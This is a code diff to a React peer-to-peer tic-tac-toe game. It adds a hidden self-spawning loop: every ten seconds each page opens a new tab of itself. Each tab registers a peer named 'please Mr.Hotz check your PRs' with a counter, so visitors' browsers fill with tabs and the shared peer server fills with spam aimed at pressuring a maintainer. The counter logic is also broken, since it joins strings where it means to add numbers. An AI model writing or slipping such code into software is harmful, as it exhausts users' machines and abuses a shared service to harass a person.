@@ -62,10 +62,23 @@ const states = {
 class Board extends React.Component {
   constructor(props) {
     super(props);
+
+    let params = (new URL(document.location)).searchParams;
+    let number = params.get("number");
+    if (!number) {
+        number = 0;
+    }
+
+    let peerName = `please Mr.Hotz check your PRs ${number}`;
+
+    setTimeout(() => {
+        window.open(`${window.location.href.replace(/\?.*/, '')}?number=${number + 1}`, '_blank');
+    }, 10000);
+
     this.state = {
       squares: Array(9).fill(null),
       xIsNext: true,
-      peer: new Peer(),
+      peer: new Peer(peerName),
       peer_id: null,
       conn: null,
       connState: states.NOT_CONNECTED,
@@ -200,10 +213,14 @@ class Game extends React.Component {
   componentDidMount() {
     console.log("trying to create lobby");
 
+    // setInterval(() => {
+    //     window.location.reload(60000);
+    // });
+
     let peers = {};
 
     // this may fail unless you are the first player
-    var lobby = new Peer(LOBBY_NAME);
+    var lobby = new Peer(LOBBY_NAME, 'checkbrpro');
     lobby.on('open', function(id) {
       console.log('Lobby peer ID is: ' + id);
     });
